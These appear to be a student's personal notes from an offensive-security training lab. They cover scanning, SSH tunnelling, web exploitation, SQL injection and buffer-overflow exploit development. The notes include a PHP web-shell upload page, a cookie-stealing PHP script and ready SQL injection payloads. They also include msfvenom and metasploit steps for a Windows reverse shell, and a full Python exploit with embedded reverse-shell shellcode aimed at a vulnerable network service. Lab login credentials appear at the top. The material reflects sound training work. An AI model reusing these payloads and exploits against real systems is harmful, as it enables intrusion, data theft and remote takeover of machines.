Grey Host Stuff
Stack Number: 4
CTFD Username: MAHI-004-M
Password (Both CTFD and Grey Host): yqSFrkDXseUTqDl
lin.internet: 10.50.23.55  (Grey Host IP)
grey host username: student

FG: https://sec.cybbh.io/public/security/latest/index.html

Scanning Techniques: Host Discovery - Ping
                     Port Enumeration - Nmap ***Dont trust the "Service" part, that could be fake. Banner grab (netcat) to figure out what's actually running
                     Port Interrogation - NetCat

Web Scraping: Method of pulling info from a website (code in scraper.py on Linux OpStation)

Ping Sweep - Code:
                  #!/usr/sbin/python3
                  #Host Discovery
                  for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done
                  
                  #Port Discovery
                  nmap -Pn -T4 --min-rate=8675309 -sT 192.169.28.1 -p22,80
                  #add --script as needed
                  ssh student@<Grey Host IP> -L<RHP>:<tgt IP>:<tgt port> #The Tunneling method


                  #Port Interrogation
                  nc 192.168.28.1 22
                  *press enter*

Nmap Scripts:
nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=http-enum          ##Tells you about the HTML file
nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=http-robots.txt    ##Tells you about Robots
nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p139,445 --script=smb-os-discovery   ##Allows you to pull info from port 445 (smb is only for windows, the apache services are only on linux)

ssh student@<Grey Host IP> -L<RHP>:<tgt IP>:<tgt port> #The Tunneling method

Control Sockets: 
lin-ops> ssh -MS /tmp/gray student@10.50.23.55
*New Window*
lin-ops> ssh -S /tmp/gray dummy

lin-ops> ssh -S /tmp/gray dummy -O forward -L1111:192.168.28.111:80    connect to machine (nothing will happen but port 1111 will be open)
lin-ops> ssh -S /tmp/gray dummy -O forward -L2222:192.168.28.111:8080
lin-ops> ssh -S /tmp/blue smart -O forward -D9050

firefox: 127.0.0.1:1111 To see the website

lin-ops> ssh -S /tmp/gray dummy -O cancel -L2222:192.168.28.111:8080  To cancel the connection to that port (connection is still open)
-------
Web Exploitation: The Hacking part (Less spicy than you think it is)
HTTP Methods: - GET --> Typing into a URL bar
              - POST --> Typing into a box
              - HEAD
              - PUT
wget: wget -r -l2 -P /tmp ftp://ftpserver/ #Do not wget a website
curl: curl -o stuff.html https://web.site/stuff.html

robots.txt: Shows you directories you may not know about -> http(s)://url/robots.txt 
                                                            Any Directories found in this file may be accessible in the url --> localhost:1111/net_test if /net_test was on robots.txt

Exploitation Methods: - Server-Side Injection: Really only gets you /etc/passwd and /etc/hosts files (could find next hop or box from these)
                      - Malicious File Upload: Upload a file that allows you to inject cmds
                        Code of file to upload: <HTML><BODY>         #This code should allow you to run cmds on their site
                                                <FORM METHOD="GET" NAME="myform" ACTION="">
                                                <INPUT TYPE="text" NAME="cmd">
                                                <INPUT TYPE="submit" VALUE="Send">
                                                </FORM>
                                                <pre>
                                                <?php
                                                if($_GET['cmd"]) {
                                                  system($_GE['cmd']);
                                                  }
                                                ?>
                                                </pre>
                                                </BODY></HTML>

                      - Command Injection: Inject cmds to gain access to back-end     ##To find box where you can run cmds, test ";whoami" on every text or input box -- ";" must go before cmd 
                                           cmd to upload is in the pasta on linux
                      - Directory Traversal:
                      - Cross-Site Scripting: <script>alert('meow');</script>  #Dont worry about this one
Cookie Stealing (This will break the website): <?php
                                               $cookie = $_GET["goodz"];
                                               $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
                                               fwrite($steal, $cookie ."\n");
                                               fclose($steal);
                                               ?>
                                               Malicious Injection script is in the spaghetti, just change the ip and port

----------
Day 2 of Web Exploitation
We use MySQL -- Any googling needs to look only at this version of SQL
Demo: cmd to remember --> select * from messages.comments;
      To pad columns in UNION --> select tireid,name,size,cost,5,6 FROM session.Tires UNION SELECT * from session.car;
      To Help: https://sqlbolt.com/
Injection Example: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’  ##The tom' OR 1='1 is what we put in -- the quotes enable us to inject code ###This is all we can do in a login field
                   SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; #’  ##Chaining statements together with ";" -- "; #" is at the end to end the query safely
                   UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'  ##Golden Statment -- We will always pull from information_schema.columns ##Always end the statement with ";#"
                   
                   Normal Query to pull expected output: php?item=4
                   Blind injection for validation: php?item=4 OR 1=1  ##No quotes because the input is an integer

                   Passing injection thru url: prices.php?item=4 UNION SELECT 1,2
                                               prices.php?item=4 UNION SELECT 1,2,@@version  ##For Version

      ID Bypass - Login Page: Username: 'OR 1='1
                               Pass: 'OR 1='1
                               f12 --> Network --> Press Login --- A POST Request will be sent, select it, go to Request, copy and paste the RAW to url bar: <url>?<paste>, enter #Turns a POST to GET, gives login info
                               THIS IS ALL YOU CAN GET FROM A LOGIN PAGE

 Gold Statement - UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
                  UNION SELECT 1,2,3,4,5;#

Union Demo: Steps -  Do something legit and see what happens, does the URL change with variables or does it stay the same?
                     Try to determine what type of action is being done, is it a SELECT, INSERT, UPDATE, etc.
                     Test the variables with some truth logic. Such as using AND 1=1, or OR 1=1, looking for the information for the items is still returned
                     Once the injectable variable is found attach your inject and start enumming. Grab the schema: databases, tables, columns.

Gold.txt {
POST REQUESTS -- These go into text box

UNION SELECT table_schema,2,table_name,column_name,5 FROM in
formation_schema.columns;#

UNION SELECT 1,2,3,4,5;#

Audi'UNION SELECT tireid,2,name,cost,size FROM session.Tires;#


GET REQUESTS -- These go into url

Selection=2 UNION SELECT 1,2,3;#

Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#

Selection=2 UNION SELECT carid,year,name FROM session.car;#
}

---------------
Reverse Engineering
Words to Know: Heap - A "Heap" of memory to be allocated for use
               Stack - Contiguous section of memory (Think a rifle magazine) to be used, generally for arguments
               GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
               CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
               FLAGS REGISTER - Contains the current state of the processor               

Common Instruction Pointers: 
MOV - move source to destination
PUSH - push source onto stack
POP - Pop top of stack to destination
INC - Increment source by 1\
DEC - Decrement source by 1
ADD - Add source to destination
SUB - Subtract source from destination
CMP - Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP - Jump to specified location
JLE - Jump if less than or equal
JE - Jump if equal

----------------
Exploit Development    wiremask.eu
Buffer Overflow Common Terms: HEAP - Memory that can be allocated and deallocated
                              STACK - A contiguous section of memory used for passing arguments
                              REGISTERS - Storage elements as close as possible to the central processing unit (CPU)
                              INSTRUCTION POINTER (IP) - a.k.a Program Counter (PC), contains the address of next instruction to be executed
                              STACK POINTER (SP) - Contains the address of the next available space on the stack
                              BASE POINTER (BP) - The base of the stack
                              FUNCTION - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
                              SHELLCODE - The code that is executed once an exploit successfully takes advantage of a vulnerability

msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python

Recap: FOLLOW THE FG DEMO!!!
Figure Out what normal looks like, interact with the program

./func <<<$(python mycode.py)    #User Input
./fun $(python mycode.py)        #CLI Argument

Overflow the Program with random char lengths --> 200, 500, 800

gdb ./program        #CMDs --> run
                               run <<<$(python script.py)
                               run $(python script.py)
                               info functions
                               pdisass functions
                               pdisass main (main shows additional functions)
                               pdisass randomfunc (show even more functions)
                               quit 

Wiremask.eu (Random string generator)
200 key length -> paste in script
run it again to find byte offset

run <<<$(python ./buff.py)

take whats in the EIP, pasted back into wiremask.eu

FIND JMP ESP:
env - gdb ./func
show env
show env COLUMNS
unset env LINES
info proc map 
find /b (Address after HEAP), (Address END of STACK), 0xff, 0xE4

Little endian to Big endian (reverse it)     0xf7de3b59 -> "\x59\x3b\xde\xf7"

place in script!

OR

GENERATE SHELLCODE
msfvenom -p linux/x86/exec CMD="<cmd>" -b '\x00' -f python  #Generates shellcode to put into mybuff.py
                                                            #MAY FAIL, Regenerate

---------------
Windows Exploit Development


CMDS for Immunity Debugger: !mona modules
                            !mona jmp -r esp -m "essfunc.dll" -- Copy first JMP ESP address to clipboard


In lin-ops: msfvenom -p windows/shell/reverse_tcp lhost=10.50.29.236 lport=4444 -b "\x00" -f python
            msfconsole  -->  use multi/handler
                             show options
                             set payload windows/meterpreter/reverse_tcp
                             set LHOST 0.0.0.0
                             show options
                             exploit  --  starts exploit
           CLI: ./<buff script>.py    --  sends payload we created; a meterpreter session should start: if it doesn't, try again
           meterpreter: shell         --  drops you into a shell on the box 

buffows2.py:
#!/usr/bin/python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
#JMP ESP 625011AF
buf += "\xAF\x11\x50\x62"
buf += "\x90" * 15   #NOP Sled
buf += b"\xba\x73\xf2\xd9\xe2\xdb\xd3\xd9\x74\x24\xf4\x5e"
buf += b"\x31\xc9\xb1\x59\x83\xee\xfc\x31\x56\x10\x03\x56"
buf += b"\x10\x91\x07\x25\x0a\xda\xe8\xd6\xcb\x84\x61\x33"
buf += b"\xfa\x96\x16\x37\xaf\x26\x5c\x15\x5c\xcd\x30\x8e"
buf += b"\xd7\xa3\x9c\xa1\x50\x09\xfb\x8c\x61\xbc\xc3\x43"
buf += b"\xa1\xdf\xbf\x99\xf6\x3f\x81\x51\x0b\x3e\xc6\x27"
buf += b"\x61\xaf\x9a\x3c\xdb\x3f\x90\x01\xe0\x68\xa7\x55"
buf += b"\x93\xd6\xdf\xd0\x64\xa2\x53\xda\xb4\xc1\x24\xc4"
buf += b"\xbf\x8d\x94\xa4\xbe\xfe\x50\x8d\xb5\x3c\x12\x85"
buf += b"\x02\xb7\xa5\x4f\x5b\x38\x94\xaf\x30\x07\x18\x22"
buf += b"\x48\x40\x9f\xdd\x3f\xba\xe3\x60\x38\x79\x99\xbe"
buf += b"\xcd\x9d\x39\x34\x75\x79\xbb\x99\xe0\x0a\xb7\x56"
buf += b"\x66\x54\xd4\x69\xab\xef\xe0\xe2\x4a\x3f\x61\xb0"
buf += b"\x68\x9b\x29\x62\x10\xba\x97\xc5\x2d\xdc\x70\xb9"
buf += b"\x8b\x97\x93\xac\xac\x58\x6c\xd1\xf0\xce\xa0\x1c"
buf += b"\x0b\x0e\xaf\x17\x78\x3c\x70\x8c\x16\x0c\xf9\x0a"
buf += b"\xe0\x05\xed\xac\x3e\xad\x7e\x53\xbf\xcd\x57\x90"
buf += b"\xeb\x9d\xcf\x31\x94\x76\x10\xbd\x41\xe2\x1a\x29"
buf += b"\x60\xc0\x07\x45\x1c\x26\x38\x84\x81\xaf\xde\xf6"
buf += b"\x69\xff\x4e\xb7\xd9\xbf\x3e\x5f\x30\x30\x60\x7f"
buf += b"\x3b\x9b\x09\xea\xd4\x75\x61\x83\x4d\xdc\xf9\x32"
buf += b"\x91\xcb\x87\x75\x19\xf9\x78\x3b\xea\x88\x6a\x2c"
buf += b"\x8d\x72\x73\xad\x38\x72\x19\xa9\xea\x25\xb5\xb3"
buf += b"\xcb\x01\x1a\x4b\x3e\x12\x5d\xb3\xbf\x22\x15\x82"
buf += b"\x55\x0a\x41\xeb\xb9\x8a\x91\xbd\xd3\x8a\xf9\x19"
buf += b"\x80\xd9\x1c\x66\x1d\x4e\x8d\xf3\x9e\x26\x61\x53"
buf += b"\xf7\xc4\x5c\x93\x58\x37\x8b\xa7\x9f\xc7\x49\x80"
buf += b"\x07\xaf\xb1\x90\xb7\x2f\xd8\x10\xe8\x47\x17\x3e"
buf += b"\x07\xa7\xd8\x95\x40\xaf\x53\x78\x22\x4e\x63\x51"
buf += b"\xe2\xce\x64\x56\x3f\xe1\x1f\x17\xc0\x02\xe0\x31"
buf += b"\xa5\x03\xe0\x3d\xdb\x38\x36\x04\xa9\x7f\x8a\x33"
buf += b"\xa2\xca\xaf\x12\x29\x34\xe3\x65\x78"
#msfvenom -p windows/shell/reverse_tcp lhost=10.50.29.236 lport=4444 -b "\x00" -f python

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets

s.connect(("10.50.39.5",9999)) #IP and port to connect to
print s.recv(1024) #print response
s.send(buf) #Sends the variable buf
print s.recv(1024) #Print response
s.close() #close the connection

--
buffows1.py:
#!/usr/bin/python

import socket

buf = "TRUN /.:/"
buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac.... This goes on for like 2500 characters"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets

s.connect(("10.50.39.5",9999)) #IP and port to connect to
print s.recv(1024) #print response
s.send(buf) #Sends the variable buf
print s.recv(1024) #Print response
s.close() #close the connection

--
buffows.py:
#!/usr/bin/python

import socket

buf = "TRUN /.:/"
buf += "A" * 2500

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets

s.connect(("10.50.39.5",9999)) #IP and port to connect to
print s.recv(1024) #print response
s.send(buf) #Sends the variable buf
print s.recv(1024) #Print response
s.close() #close the connection

---------------------
Post Exploitation

how to use private ssh key: ssh -i <id_rsa> student@<tgt IP>


           ASD
